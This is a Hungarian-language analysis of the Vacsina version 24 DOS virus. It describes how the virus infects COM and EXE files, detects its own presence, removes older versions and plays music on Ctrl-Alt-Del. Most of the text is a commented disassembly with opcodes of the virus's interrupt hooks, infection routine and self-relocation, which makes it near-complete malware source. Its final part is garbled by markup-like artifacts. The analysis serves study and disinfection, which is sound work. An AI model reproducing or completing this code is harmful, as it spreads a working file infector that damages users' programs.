



                           **************************
                           * Vacsina 24-es verzi¢ja *
                           **************************

A v¡rus hossza 1760D-1775D byte.

A v¡rus 32D byten l hosszabb ‚s 61559D byten l r”videbb COM ‚s EXE,esetleg OV? f
						ileokat fert”z meg.
A file v‚g‚t paragrafushat rra v gja ‚s odam solja mag t a lentebb l that¢ form 
						ban. A file elej‚re
legyen az EXE vagy COM egy JMP utas¡t st ¡r, ami a bel‚p‚si pontra (038B) mutat.
						 Egy filet csak
egyszer fert”z meg. A kor bbi verzi¢j£ Vacsin kat ki”li. A fert”z”tts‚get a file
						 utols¢ 8 byteja
alapj n d”nti el. Ez alapj n ¡rtja ki a kor bbi verzi¢kat. ( HZVIR is ez alapj n
						 ¡rt az alapos
ellen”rz‚sn‚l. Mi t”bb a Yankee Doodle is ¡r maga ut n 8 ilyen byteot ( csak COM
						 filen l), ¡gy az
is irthat¢ ¡gy. A HZVIR a Yankee Doodleokat m‚gis m shogy ¡rtja!

A v¡rus els” beh¡v sakor egy g‚pen n”veli az INIC_SZ-t. Majd szaporod skor m r e
						zzel az ‚rt‚kkel
m sol¢dik. Csak akkor zen‚l Ctrl-Alt-Del-n‚l a v¡rus, ha INIC_SZ>=10D.
Egy‚b k ros tev‚kenys‚ge a v¡rusnak nincs.

A ki¡rt shoz minden adat megtal lhat¢ 06D8-t¢l.

V ltoz sok a Vacsina 16-os verzi¢j hoz k‚pest:
- EXE filet m r val¢ban fert”z.
- Zen‚l Ctrl-Alt-Del-n‚l.
- M r meg llap¡tja a DOS val¢di bel‚p‚si pontj t. Ez‚rt h l¢zatra m r nem megy f
						el.
- M r a C5xx DOS funkci¢val k‚rdezi le mag t.
- A mem¢riale¡r¢ blokkot m r nem cipeli mag val.


     ;---------------------------------------------------------------
     ;                          V ltoz¢k
     ;---------------------------------------------------------------

0000 C_084D        DW   084D      ;Konstans. Ennyivel fogja a v¡rus h tr‚bb pako
						lni a programot
0001               DB   0         ;Nem haszn lt
0003 VIR_HOSSZ     DW   006D      ;V¡rus hossza DIV 16
0004               DB   0C DUP 0  ;Nem haszn lt
0010 TISZTA_INT21  DD   ?         ;A DOS val¢di bel‚p‚si pontja ha a l‚p‚senk‚nt
						i v‚grehajt ssal
                                  ;meg tudja  llap¡tani. Egy‚bk‚nt az INT 21 ere
						deti tartalma
0014 ERE_INT21     DD   ?         ;Az INT 21 eredeti c¡me
0018 ERE_INT24     DD   ?         ;Az INT 24 eredeti c¡me
001C ERE_INT09     DD   ?         ;Az INT 09 eredeti c¡me
0020 F_ATTR        DW   ?         ;File attributtuma
0022 HANDLE        DW   ?         ;File handle
0024 F_DTTM        DD   ?         ;File d tuma, ideje
0028 ERE_AX        DW   ?         ;ax eredeti ‚rt‚ke (program futtat s n l )
002A TRAP_FLAG     DB   ?         ;Ha ‚rt‚ke 1 akkor enged‚lyezett a l‚p‚senk‚nt
						i futtat s
                                  ;Ha 0 akkor nem
002B VEZERLO       DB   1         ;Verzi¢sz mokn l j tszik valamilyen szerepet.N
						em tudtam eld”nteni
                                  ;hogy mit csin l !!! Ha a 0. bitje 0 nem fert”
						z a v¡rus.
002C INIC_SZ       DB   ?         ;Inicializ l sok sz ma. Csak a ****-dik inicia
						liz l s ut n zen‚l
002D BUFFER        DB   14 DUP (?);14 byte buffer. Ide olvassa be egy file ut¢ls
						¢ 8 bytej t
                                  ;Ez alapj n d”nti el, hogy egy file fert”z”tt-
						e m r.
                                  ;Ide olvassa be egy file els” 14 bytej t (EXE-
						n‚l ez a HEADER)
  ;Fel‚p¡t‚se (fert”z”tt filen l):
     ;   002D      DW   ?         ;File eredeti hossza
     ;   002F      DW   ?         ;File eredeti 2.,3. byteja mint sz¢ + 0103 !
     ;   0031      DW   7AF4      ;Azonos¡t¢ sz¢. Ez alapj n ismeri fel, hogy fe
						rt”z”tt a file
     ;   0033      DB   18        ;Verzi¢sz m
     ;   0034      DB   ?         ;9-esn‚l nagyobb verzi¢n l a file eredeti els”
						 byteja

  ;Itt  ll¡tja el” az eredeti els” 3 byteot is
     ;   002D      DB   ?         ;File eredeti els” byteja lesz itt.
     ;   002E      DW   ?         ;Ide menti a file eredeti 2.,3. bytej t j¢l ! 
						(Egy fert”z”tt
                                  ;file fert”tlen¡t‚sekor
  ;EXE HEADERn‚l:
     ;   002D      DW   5A4D      ;EXE jelz”
     ;   002F      DW   ?         ;File hossz modulo 512
     ;   0031      DW   ?         ;File hossz 512-es lapokban
     ;   0033      DW   ?         ;Relok ci¢s t bla hossza
     ;   0035      DW   ?         ;Header hossza paragrafusokban
     ;   0037      DW   ?         ;Mem¢riaig‚ny (min)
     ;   0039      DW   ?         ;Mem¢riaig‚ny (max)


     ;---------------------------------------------------------------
     ;                       V ltoz¢terlet v‚ge
     ;---------------------------------------------------------------


     ;---------------------------------------------------------------
     ;            Egy hossz£ ugr s az eredeti DOS-ra
     ;---------------------------------------------------------------

003B FF2E1000    * JMP	FAR [0010]          ;TISZTA_INT21 ‚rt‚ke ekkor m‚g=ERE_IN
						T21-gyel


     ;---------------------------------------------------------------
     ;                       Tiszta INT 21 h¡v s
     ;---------------------------------------------------------------

003F 9C          * PUSHF
0040 FA            CLI
0041 2E            CS:
0042 FF1E1400      CALL	FAR [0014]
0046 C3            RET


     ;---------------------------------------------------------------
     ;              Directory bejegyz‚s aktualiz l sa
     ;---------------------------------------------------------------

0047 53            PUSH	BX
0048 50            PUSH	AX
0049 2E            CS:
004A 8B1E2200      MOV	BX,[0022]           ;HANDLE
004E B445          MOV	AH,45               ;DUPLICATE_FILE_HANDLE
0050 E8ECFF        CALL	003F                ;TINT 21
0053 7209          JB	005E                ;Hib n l CF-fel t‚r vissza
0055 8BD8          MOV	BX,AX               ;£j handle
0057 B43E          MOV	AH,3E               ;CLOSE_HANDLE
0059 E8E3FF        CALL	003F                ;TINT 21
005C EB01          JMP	005F                ;Hib n l CF-fel, egy‚bk‚nt NC-vel t‚r
						 vissza
005E F8          * CLC
005F 58          * POP	AX
0060 5B            POP	BX
0061 C3            RET


     ;---------------------------------------------------------------
     ;                 INT 24 (Dos kritikus hibakezel”je)
     ;---------------------------------------------------------------

0062 B003        * MOV	AL,03               ;Kritikus hib n l DOS hib t gener ljo
						n !
0064 CF            IRET


     ;---------------------------------------------------------------
     ;            INT 09 (Billentyzet hardware interruptja)
     ;---------------------------------------------------------------

     ; Ha a CTRL-ALT-DEL le van nyomva ‚s INIC_SZ>=10D akkor zen‚l

0065 50          * PUSH	AX
0066 E460          IN	AL,60               ;Scan k¢d beolvas sa
0068 3C53          CMP	AL,53               ;<del> k¢dja
006A 752E          JNZ	009A                ;Ha nem ugr s az eredeti rutinra
006C B402          MOV	AH,02               ;Shift st tusz lek‚rdez‚se
006E CD16          INT	16
0070 240C          AND	AL,0C
0072 3C0C          CMP	AL,0C               ;Crtl-Alt
0074 7524          JNZ	009A                ;Ha nincs mind a kett” lenyomva ugr s
0076 8CC8          MOV	AX,CS
0078 8ED8          MOV	DS,AX               ;Szegmensek be ll¡t sa
007A 8ED0          MOV	SS,AX
007C BCFEFF        MOV	SP,FFFE
007F 2E            CS:
0080 803E2C000A    CMP	BYTE PTR [002C],0A  ;INIC_SZ
0085 7203          JB	008A                ;Ha 10D-n‚l kevesebbszer inicializ l¢d
						ott a v¡rus
0087 E89705        CALL	0621                ;Zen‚lj!
008A B80000        MOV	AX,0000
008D 8ED8          MOV	DS,AX
008F C70672043412  MOV	WORD PTR [0472],1234;Meleg reset jelz‚s
0095 EAF0FF00F0    JMP	F000:FFF0           ;REBOOT
009A 58          * POP	AX
009B 2E            CS:
009C FF2E1C00      JMP	FAR [001C]          ;ERE_INT09 eredeti rutin futtat sa


     ;---------------------------------------------------------------
     ;                  INT 21  (Dos bel‚p‚si pontja)
     ;---------------------------------------------------------------
     ;                Leflelt DOS funkci¢k sz‚toszt sa

00A0 9C          * PUSHF                    ;Megj.: t”k felesleges
00A1 3D004B        CMP	AX,4B00             ;EXECUTE
00A4 7461          JZ	0107
00A6 3D00C5        CMP	AX,C500             ;ax=18H, STC, IRET-et hajt v‚gre
00A9 7448          JZ	00F3
00AB 3D01C5        CMP	AX,C501             ;ah=0, al=[002B], STC, IRET-et hajt v
						‚gre
00AE 7448          JZ	00F8
00B0 3D02C5        CMP	AX,C502             ;[002B]=cl, STC, IRET-et hajt v‚gre
00B3 744B          JZ	0100
00B5 3D03C5        CMP	AX,C503             ;es:bx=TISZTA_INT21 ‚s vmi egy‚b
00B8 740C          JZ	00C6
00BA 9D            POPF
00BB 2E            CS:
00BC FF2E1000      JMP	FAR [0010]          ;ERE_INT21 futtat sa


     ;---------------------------------------------------------------
     ;             Visszat‚r‚s a C5xx alfunkci¢kn l
     ;---------------------------------------------------------------

00C0 9D          * POPF
00C1 FB            STI
00C2 F9            STC                      ;Jelz‚s, hogy a vacsina kld adatot
00C3 CA0200        RETF	0002                ;Visszat‚r‚s


     ;---------------------------------------------------------------
     ;                     C503 DOS alfunkci¢
     ;---------------------------------------------------------------
     ;  Be:  bx=h¡v¢ vacsina verzi¢sz ma
     ;  Ha nagyobb verzi¢j£ vacsina h¡vta NC-vel t‚r vissza, egyebk‚nt CF-fel t‚
						r vissza jelezv‚n
     ;  hogy a v¡rus m r a mem¢ri ban van.

00C6 B81900      * MOV	AX,0019             ;Verzi¢sz m+1
00C9 2E            CS:
00CA F6062B0002    TEST	BYTE PTR [002B],02  ;VEZERLO ???
00CF 7501          JNZ	00D2
00D1 48            DEC	AX
00D2 3BD8        * CMP	BX,AX
00D4 B000          MOV	AL,00               ;Megj.: ‚rdekes, hogy a Yankee Doodle
						-ben itt hib san
00D6 D0D0          RCL	AL,1                ;XOR AL,AL van, ami t”rli a carry-t
00D8 50            PUSH	AX                  ;ax-ben 0 vagy 1
00D9 B81800        MOV	AX,0018
00DC 2E            CS:
00DD F6062B0004    TEST	BYTE PTR [002B],04  ;VEZERLO ???
00E2 7501          JNZ	00E5
00E4 40            INC	AX
00E5 3BD8        * CMP	BX,AX               ;Ha nagyobb verzi¢j£ vacsina h¡vta NC
						-vel t‚r vissza
00E7 2E            CS:
00E8 C41E1400      LES	BX,[0014]           ;es:bx=ERE_INT21
00EC 58            POP	AX
00ED 44            INC	SP                  ;popf-et helyettes¡ti
00EE 44            INC	SP
00EF FB            STI
00F0 CA0200        RETF	0002

     ;---------------------------------------------------------------
     ;                     C500 DOS alfunkci¢
     ;---------------------------------------------------------------

00F3 B81800      * MOV	AX,0018
00F6 EBC8          JMP	00C0                ;Visszat‚r‚s CF-fel


     ;---------------------------------------------------------------
     ;                     C501 DOS alfunkci¢
     ;---------------------------------------------------------------

00F8 2E          * CS:
00F9 A02B00        MOV	AL,[002B]           ;Nem tudom pontosan mit jelent!
00FC B400          MOV	AH,00
00FE EBC0          JMP	00C0                ;Visszat‚r‚s CF-fel


     ;---------------------------------------------------------------
     ;                     C502 DOS alfunkci¢
     ;---------------------------------------------------------------

0100 2E          * CS:
0101 880E2B00      MOV	[002B],CL           ;[002B] be ll¡t sa (nem tudom mit jel
						ent)
0105 EBB9          JMP	00C0                ;Visszat‚r‚s Cf-gel


     ;---------------------------------------------------------------
     ;                 Leflelt DOS 4B00 alfunkci¢
     ;---------------------------------------------------------------
     ;     INT 24 (DOS kritikus hibakezel”je) lek‚rdez‚re  t¡r sa

0107 06          * PUSH	ES                  ;bp+10
0108 1E            PUSH	DS                  ;bp+0E
0109 55            PUSH	BP                  ;bp+0C
010A 57            PUSH	DI                  ;bp+0A
010B 56            PUSH	SI                  ;bp+08
010C 52            PUSH	DX                  ;bp+06
010D 51            PUSH	CX                  ;bp+04
010E 53            PUSH	BX                  ;bp+02
010F 50            PUSH	AX                  ;bp+00
0110 8BEC          MOV	BP,SP
0112 B82435        MOV	AX,3524             ;GET_INT_VECT (es:bx)
0115 E827FF        CALL	003F                ;Tiszta int 21 h¡v s (a tov bbiakban
						 TINT 21)
0118 2E            CS:
0119 8C061A00      MOV	[001A],ES           ;ERE_INT24 szegmense
011D 2E            CS:
011E 891E1800      MOV	[0018],BX           ;ERE_INT24 offsetje
0122 0E            PUSH	CS
0123 1F            POP	DS                  ;ds=cs
0124 BA6200        MOV	DX,0062
0127 B82425        MOV	AX,2524             ;SET_INT_VECT (ds:dx)
012A E812FF        CALL	003F                ;TINT 21


     ;ds:dx  ltal mutatott nev file attributtum nak lek‚rdez‚se, ‚s R/O t”rl‚se

012D B80043        MOV	AX,4300             ;GET_FILE_ATTR (cx)
0130 8E5E0E        MOV	DS,[BP+0E]          ;eredeti ds
0133 8B5606        MOV	DX,[BP+06]          ;eredeti dx
0136 E806FF        CALL	003F                ;TINT 21
0139 7303          JNB	013E                ;Ha nincs hiba (l‚tezik a file)
013B E93302        JMP	0371                ;Hib n l INT 24 vissza ll¡t sa, erede
						ti DOS h¡v s
013E 2E          * CS:
013F 890E2000      MOV	[0020],CX           ;F_ATTR
0143 B80143        MOV	AX,4301             ;SET_FILE_ATTR (cx)
0146 80E1FE        AND	CL,FE               ;R/O bit t”rl‚se
0149 E8F3FE        CALL	003F                ;TINT 21
014C 7303          JNB	0151                ;Ha nincs hiba
014E E92002        JMP	0371                ;Hib n l INT 24 vissza ll¡t sa, erede
						ti DOS h¡v s


     ;                 File megnyit sa ¡r sra, olvas sra

0151 B8023D      * MOV	AX,3D02             ;OPEN_HANDLE (ax) ¡r sra,olvas sra
0154 8E5E0E        MOV	DS,[BP+0E]          ;eredeti ds
0157 8B5606        MOV	DX,[BP+06]          ;eredeti dx
015A E8E2FE        CALL	003F                ;TINT 21
015D 7303          JNB	0162                ;Ha nincs hiba
015F E9FE01        JMP	0360                ;Hib n l INT 24,F_ATTR vissza ll¡t sa
						, eredeti DOS
0162 2E          * CS:
0163 A32200        MOV	[0022],AX           ;HANDLE
0166 8BD8          MOV	BX,AX


     ;                    File idej‚nek lek‚rdez‚se

0168 B80057        MOV	AX,5700             ;GET_FILE_DTTM (cx:dx)
016B E8D1FE        CALL	003F                ;TINT 21
016E 2E            CS:
016F 890E2400      MOV	[0024],CX           ;F_DTTM  (time)
0173 2E            CS:
0174 89162600      MOV	[0026],DX           ;F_DTTM+2 (date)


     ;A file utols¢ 8 bytej nak beolvas sa a BUFFER-be, ‚s a fert”z”tts‚g vizsg 
						lata

0178 0E            PUSH	CS
0179 1F            POP	DS                  ;ds=cs
017A B80242      * MOV	AX,4202             ;File pointer a file v‚ge-8-dik poz¡c
						i¢ra
017D B9FFFF        MOV	CX,FFFF
0180 BAF8FF        MOV	DX,FFF8
0183 8B1E2200      MOV	BX,[0022]           ;HANDLE
0187 E8B5FE        CALL	003F                ;TINT 21
018A 7221          JB	01AD                ;Hib n l INT 24, F_ATTR, F_DTTM vissza
						 ll¡t sa, CLOSE
018C 8B1E2200      MOV	BX,[0022]           ;HANDLE
0190 BA2D00        MOV	DX,002D             ;BUFFER c¡me ds:dx-ben
0193 B90800        MOV	CX,0008             ;8 byte olvas sa
0196 B43F          MOV	AH,3F               ;READ_HANDLE (bx,cx,ds:dx)
0198 E8A4FE        CALL	003F                ;TINT 21
019B 7210          JB	01AD                ;Hib n l INT 24, F_ATTR, F_DTTM vissza
						 ll¡t sa, CLOSE
019D 3D0800        CMP	AX,0008             ;Beolvasta-e mind a 8 byteot?
01A0 750B          JNZ	01AD                ;Hib n l INT 24, F_ATTR, F_DTTM vissz
						a ll¡t sa, CLOSE
01A2 813E3100F47A  CMP	WORD PTR [0031],7AF4;Fert”z”tt-e a file?
01A8 7406          JZ	01B0                ;Ha fert”z”tt ugr s
01AA E98C00        JMP	0239                ;Lehet megfert”zni a filet


     ;  Seg‚dugr s hib n l ( INT 24, F_ATTR, F_DTTM vissza ll¡t sa, CLOSE )

01AD E99601      * JMP	0346


     ;---------------------------------------------------------------
     ;            A file m r fert”z”tt Vacsina v¡russal
     ;---------------------------------------------------------------
     ;                  Milyen verzi¢j£ v¡rus?

01B0 B418        * MOV	AH,18
01B2 F6062B0002    TEST	BYTE PTR [002B],02 ;VEZERLO ???
01B7 7402          JZ	01BB
01B9 FEC4          INC	AH
01BB 38263300    * CMP	[0033],AH          ;A fileban l‚v” v¡rus verzi¢ja
01BF 73EC          JNB	01AD               ;Ha egyezik vagy nagyobb-> nem fert”z
						nk


     ;      Egy fert”z”tt fileb¢l a szks‚ges inform ci¢k kiv‚tele

01C1 8A0E3400      MOV	CL,[0034]          ;9-esn‚l nagyobb verzi¢n l a file ered
						eti els” byteja
01C5 A12D00        MOV	AX,[002D]          ;File eredeti hossza
01C8 A3D806        MOV	[06D8],AX          ;ERE_HOSSZ
01CB A12F00        MOV	AX,[002F]          ;File eredeti 2.,3. byteja mint sz¢ + 
						0103 !
01CE A3DA06        MOV	[06DA],AX          ;ERE_2_3
01D1 2D0301        SUB	AX,0103            ;Val¢di eredeti 2.,3. byte
01D4 A32E00        MOV	[002E],AX          ;Elt rolja
01D7 803E330009    CMP	BYTE PTR [0033],09
01DC 7702          JA	01E0               ;9-es verzi¢n l nagyobb?
01DE B1E9          MOV	CL,E9              ;Egy‚bk‚nt az els” byte egy JMP k¢dja
01E0 880E2D00    * MOV	[002D],CL          ;Elt rolja
01E4 880EDF06      MOV	[06DF],CL          ;ERE_1


     ;         Egy fert”z”tt fileb¢l a r‚gebbi vacsina ki¡rt sa
     ;              Az eredeti els” 3 byte vissza ll¡t sa:

01E8 B80042        MOV	AX,4200            ;MOVE_FILE_POINTER (cx:dx)
01EB B90000        MOV	CX,0000            ;File elej‚re  ll s
01EE BA0000        MOV	DX,0000
01F1 8B1E2200      MOV	BX,[0022]          ;HANDLE
01F5 E847FE        CALL	003F               ;TINT 21
01F8 72B3          JB	01AD               ;Hib n l
01FA B440          MOV	AH,40              ;WRITE_HANDLE (bx,cx,ds:ds)
01FC BA2D00        MOV	DX,002D
01FF B90300        MOV	CX,0003
0202 E83AFE        CALL	003F               ;TINT 21
0205 72A6          JB	01AD               ;Hib n l
0207 3D0300        CMP	AX,0003            ;Ki¡rta-e mind a 3 byteot?
020A 75A1          JNZ	01AD               ;Hib n l
020C E838FE        CALL	0047               ;Directory bejegyz‚s aktualiz l sa
020F 729C          JB	01AD               ;Hib n l


     ;                  File m‚retre v g sa:

0211 B80042        MOV	AX,4200            ;MOVE_FILE_POINTER (cx:dx)
0214 B90000        MOV	CX,0000
0217 8B16D806      MOV	DX,[06D8]          ;ERE_HOSSZ
021B 8B1E2200      MOV	BX,[0022]          ;HANDLE
021F E81DFE        CALL	003F               ;TINT 21
0222 7289          JB	01AD               ;Hib n l
0224 B440          MOV	AH,40              ;WRITE_HANDLE
0226 B90000        MOV	CX,0000            ;Csonkol s
0229 E813FE        CALL	003F               ;TINT 21
022C 7208          JB	0236               ;Hib n l
022E E816FE        CALL	0047               ;Directory bejegyz‚s aktualiz l sa
0231 7203          JB	0236               ;Hib n l
0233 E944FF        JMP	017A               ;K‚sz: le¡rtottuk a v¡rust, de h tha v
						an m‚g egy


     ;  Seg‚dugr s hib n l ( INT 24, F_ATTR, F_DTTM vissza ll¡t sa, CLOSE )

0236 E90D01      * JMP	0346


     ;---------------------------------------------------------------
     ;         A file m‚g/m r nem fert”z”tt, lehet megfert”zni
     ;---------------------------------------------------------------
     ;       Csak akkor fert”z, ha [002B] and 1 = 1 !!!

0239 F6062B0001  * TEST	BYTE PTR [002B],01  ;VEZERLO
023E 74F6          JZ	0236                ;Nem fert”z !!!


     ;    Csak akkor fert”zi a filet, ha  32 < hossz="">< 61559="" 0240="" b80242="" mov="" ax,4202="" ;move_file_pointer="" (cx:dx)="" 0243="" b90000="" mov="" cx,0000="" 0246="" 8bd1="" mov="" dx,cx="" ;file="" v‚g‚re=""  ll s="" 0248="" 8b1e2200="" mov="" bx,[0022]="" ;handle="" 024c="" e8f0fd="" call="" 003f="" ;tint="" 21="" 024f="" 72e5="" jb="" 0236="" ;hib n l="" 0251="" 83fa00="" cmp="" dx,+00="" ;dx:ax-ben="" a="" file="" hossza="" 0254="" 75e0="" jnz="" 0236="" ;nagyobb="" mint="" 64k-="">nem fert”zzk
0256 3D2000        CMP	AX,0020
0259 76DB          JBE	0236                ;Ha 32D byten l kisebb vagy egyenl”
025B 3D77F0        CMP	AX,F077
025E 90            NOP                      ;Megj.: Ez a NOP minek van itt?
025F 73D5          JNB	0236                ;Ha 61559 byten l hosszabb vagy egyen
						l”
0261 A3D806        MOV	[06D8],AX           ;ERE_HOSSZ


     ;                    File elj‚re  ll

0264 B80042        MOV	AX,4200             ;MOVE_FILE_POINTER (cx:dx)
0267 B90000        MOV	CX,0000
026A 8BD1          MOV	DX,CX               ;File elej‚re  ll
026C 8B1E2200      MOV	BX,[0022]           ;HANDLE
0270 E8CCFD        CALL	003F                ;TINT 21
0273 72C1          JB	0236                ;Hib n l


     ;           A BUFFERbe a file els” 14D bytej nak beolvas sa

0275 BA2D00        MOV	DX,002D             ;BUFFER
0278 B90E00        MOV	CX,000E
027B B43F          MOV	AH,3F               ;READ_HANDLE (bx,cx,ds:dx)
027D E8BFFD        CALL	003F                ;TINT 21
0280 72B4          JB	0236                ;Hib n l
0282 3D0E00        CMP	AX,000E
0285 75AF          JNZ	0236                ;Hib n l
0287 813E2D004D5A  CMP	WORD PTR [002D],5A4D
028D 740B          JZ	029A                ;Ugr s, ha EXE
028F 813E2D005A4D  CMP	WORD PTR [002D],4D5A
0295 7403          JZ	029A
0297 EB15          JMP	02AE                ;COM filen l
0299 90            NOP


     ;     EXE file megfert”z‚se (nem fert”zzk meg, ha hib s a header)

029A 833E3900FF  * CMP	WORD PTR [0039],-01 ;Mem¢riaig‚ny (max)
029F 7595          JNZ	0236                ;Ha nem FFFF nem fert”zzk (mi‚rt ?)
02A1 A13100        MOV	AX,[0031]           ;File hossz 512-es lapokban
02A4 B109          MOV	CL,09
02A6 D3E0          SHL	AX,CL               ;*512
02A8 3B06D806      CMP	AX,[06D8]           ;Stimmel-e a hossz?
02AC 7288          JB	0236                ;Ha nem nem fert”znk


     ;            File megfert”z‚se (EXE-b”l is COM-ot csin l)
     ;                    Els” 3 byte meg”rz‚se

02AE A12E00      * MOV	AX,[002E]           ;File 2.,3. byteja
02B1 050301        ADD	AX,0103             ;+ 0103 !!!
02B4 A3DA06        MOV	[06DA],AX           ;ERE_2_3
02B7 A02D00        MOV	AL,[002D]           ;File 1. byteja
02BA A2DF06        MOV	[06DF],AL           ;ERE_1


     ;               Filehossz kerk¡t‚se paragrafushat rra

02BD B80042        MOV	AX,4200             ;MOVE_FILE_POINTER
02C0 B90000        MOV	CX,0000
02C3 8B16D806      MOV	DX,[06D8]           ;ERE_HOSSZ
02C7 83C20F        ADD	DX,+0F
02CA 83E2F0        AND	DX,-10              ;Filehossz kerek¡t‚se
02CD 8B1E2200      MOV	BX,[0022]           ;HANDLE
02D1 E86BFD        CALL	003F                ;TINT 21
02D4 7303          JNB	02D9
02D6 EB6E        * JMP	0346                ;Hib n l
02D8 90            NOP


     ;              A v¡rus hozz ¡rja mag t a filehoz

02D9 8B1E2200    * MOV	BX,[0022]           ;HANDLE
02DD 8CCA          MOV	DX,CS               ;???
02DF BA0000        MOV	DX,0000
02E2 B9E006        MOV	CX,06E0             ;V¡rus hossza
02E5 B440          MOV	AH,40               ;WRITE_HANDLE
02E7 FF362B00      PUSH	[002B]              ;Meg”rzi (VEZERLO)
02EB C6062B0001    MOV	BYTE PTR [002B],01  ;fert”z” p‚ld ny jelz‚s
02F0 E84CFD        CALL	003F                ;TINT 21
02F3 5A            POP	DX
02F4 88162B00      MOV	[002B],DL           ;Vissza ll¡tja
02F8 72DC          JB	02D6                ;Hib n l
02FA 3DE006        CMP	AX,06E0             ;Ki¡rta-e mind a 06E0 byteot
02FD 75D7          JNZ	02D6                ;Hib n l
02FF E845FD        CALL	0047                ;Directory bejegyz‚s aktualiz l sa
0302 72D2          JB	02D6                ;Hib n l


     ;      A file leend” els” 3 bytej nak el” ll¡t sa a BUFFER-ben

0304 C6062D00E9    MOV	BYTE PTR [002D],E9  ;JMP k¢dja
0309 2E            CS:
030A 8B16D806      MOV	DX,[06D8]           ;ERE_HOSSZ
030E 83C20F        ADD	DX,+0F
0311 83E2F0        AND	DX,-10              ;Kerek¡t‚s
0314 83EA03        SUB	DX,+03              ;-3 a JMP miatt
0317 81C28B03      ADD	DX,038B             ;+ a bel‚p‚si pont offsetje a v¡ruson
						 bell
031B 89162E00      MOV	[002E],DX           ;JMP operandusa


     ;                     Az els” 3 byte  t¡r sa

031F B80042        MOV	AX,4200             ;MOVE_FILE_POINTER (cx:dx)
0322 B90000        MOV	CX,0000
0325 8BD1          MOV	DX,CX               ;File elej‚re  ll s
0327 8B1E2200      MOV	BX,[0022]           ;HANDLE
032B E811FD        CALL	003F                ;TINT 21
032E 72A6          JB	02D6                ;Hib n l
0330 8B1E2200      MOV	BX,[0022]           ;HANDLE
0334 BA2D00        MOV	DX,002D             ;BUFFER
0337 B90300        MOV	CX,0003             ;3 byte
033A B440          MOV	AH,40               ;WRITE_HANDLE (bx,cx,ds:dx)
033C E800FD        CALL	003F                ;TINT 21
033F 7295          JB	02D6                ;Hib n l
0341 3D0300        CMP	AX,0003
0344 7590          JNZ	02D6                ;Hib n l


     ;          File d tum nak vissza ll¡t sa, lez r s

0346 2E          * CS:
0347 8B1E2200      MOV	BX,[0022]           ;HANDLE
034B 2E            CS:
034C 8B0E2400      MOV	CX,[0024]           ;F_DTTM (time)
0350 2E            CS:
0351 8B162600      MOV	DX,[0026]           ;F_DTTM+2 (date)
0355 B80157        MOV	AX,5701             ;SET_FILE_DTTM (cx:dx)
0358 E8E4FC        CALL	003F                ;TINT 21
035B B43E          MOV	AH,3E               ;CLOSE_HANDLE (bx)
035D E8DFFC        CALL	003F                ;TINT 21


     ;          File eredeti attributtum nak vissza ll¡t sa

0360 B80143      * MOV	AX,4301             ;SET_FILE_ATTR
0363 8E5E0E        MOV	DS,[BP+0E]          ;eredeti ds
0366 8B5606        MOV	DX,[BP+06]          ;eredeti dx
0369 2E            CS:
036A 8B0E2000      MOV	CX,[0020]           ;F_ATTR
036E E8CEFC        CALL	003F                ;TINT 21


     ;         Eredeti INT 24 vissza¡r sa, eredeti DOS h¡v sa

0371 B82425      * MOV	AX,2524             ;SET_INT_VECT (ds:dx)
0374 2E            CS:
0375 C5161800      LDS	DX,[0018]           ;ERE_INT24
0379 E8C3FC        CALL	003F                ;TINT 21
037C 58            POP	AX
037D 5B            POP	BX
037E 59            POP	CX
037F 5A            POP	DX
0380 5E            POP	SI
0381 5F            POP	DI
0382 5D            POP	BP
0383 1F            POP	DS
0384 07            POP	ES
0385 9D            POPF
0386 2E            CS:
0387 FF2E1000      JMP  FAR [0010]          ;ERE_INT21


     ;---------------------------------------------------------------
     ;                           Bel‚p‚si pont
     ;---------------------------------------------------------------

038B E80000      * CALL 038E
038E 5B          * POP  BX                  ;***  BX=038E  ***
038F 2E            CS:
0390 89879AFC      MOV  [BX+FC9A],AX        ;ERE_AX (0028) ax ment‚se
0394 2E            CS:
0395 FE879EFC      INC  BYTE PTR [BX+FC9E]  ;INIC_SZ (002C) inicializ l sok sz m
						 nak n”vel‚s


     ;                          ™nlek‚rdez‚s

0399 53            PUSH BX                  ;bx=038E
039A BB1800        MOV  BX,0018             ;bx=24D (verzi¢sz m)
039D F8            CLC
039E B803C5        MOV  AX,C503             ;™nlek‚rdez‚s. CF-fel t‚r vissza, ha
						 akt¡v
03A1 CD21          INT  21                  ;Megj.:Novell if CF-et ad vissza, az
						t hiszem
03A3 5B            POP  BX                  ;bx=038E
03A4 7227          JB   03CD                ;Ugr s, ha m r akt¡v az redeti progr
						am futtat s ra


     ;            A v¡rus h tr‚bb m solja mag t ([0000]+1 paragrafussal)

03A6 83FCF0        CMP  SP,-10
03A9 7222          JB   03CD                ;Ha sp<fff0 akkor="" nincs="" el‚g="" szabad="" mem¢ria="" 03ab="" 2e="" cs:="" 03ac="" 8b9775fc="" mov="" dx,[bx+fc75]="" ;c_084d="" (0000)="" konstans="" 03b0="" 42="" inc="" dx="" 03b1="" 8cd9="" mov="" cx,ds="" 03b3="" 03d1="" add="" dx,cx="" 03b5="" 8ec2="" mov="" es,dx="" ;es="DS+084E" 03b7="" 8bf3="" mov="" si,bx="" ;bx="038E" 03b9="" 81c672fc="" add="" si,fc72="" ;si="0000" (v¡rus="" kezdete)="" 03bd="" 8bfe="" mov="" di,si="" 03bf="" b9e006="" mov="" cx,06e0="" ;v¡rus="" hossza="" 03c2="" fc="" cld="" 03c3="" f3="" repz="" 03c4="" a4="" movsb="" ;="" a="" vez‚rl‚s=""  tkerl="" a="" m solat="" v¡rusra="" 03c5="" 06="" push="" es="" 03c6="" e80300="" call="" 03cc="" 03c9="" e9b300="" jmp="" 047f="" ;es:047f-en="" folytat¢dik="" a="" v‚grehajt ="" s="" 03cc="" cb="" *="" retf="" ;---------------------------------------------------------------="" ;="" az="" eredeti="" program="" futtat sa="" ;---------------------------------------------------------------="" ;="" vissza ll¡tja="" az="" eredeti="" els”="" 3="" byteot="" 03cd="" 8cc8="" *="" mov="" ax,cs="" ;£j_cs="" 03cf="" 8ed8="" mov="" ds,ax="" 03d1="" 8ec0="" mov="" es,ax="" 03d3="" 8ed0="" mov="" ss,ax="" 03d5="" 83c402="" add="" sp,+02="" 03d8="" b80000="" mov="" ax,0000="" ;a="" stacken="" 0000-nak="" kell="" lennie,="" hog="" y="" egy="" sima="" ret="" 03db="" 50="" push="" ax="" ;a="" dos-ba="" t‚rjen="" vissza="" !="" 03dc="" 2e="" cs:="" 03dd="" 8a875103="" mov="" al,[bx+0351]="" ;ere_1="" (06df)="" a="" file="" eredeti="" 1.="" byte="" ja="" 03e1="" 2e="" cs:="" 03e2="" a20001="" mov="" [0100],al="" ;vissza ll¡t s="" 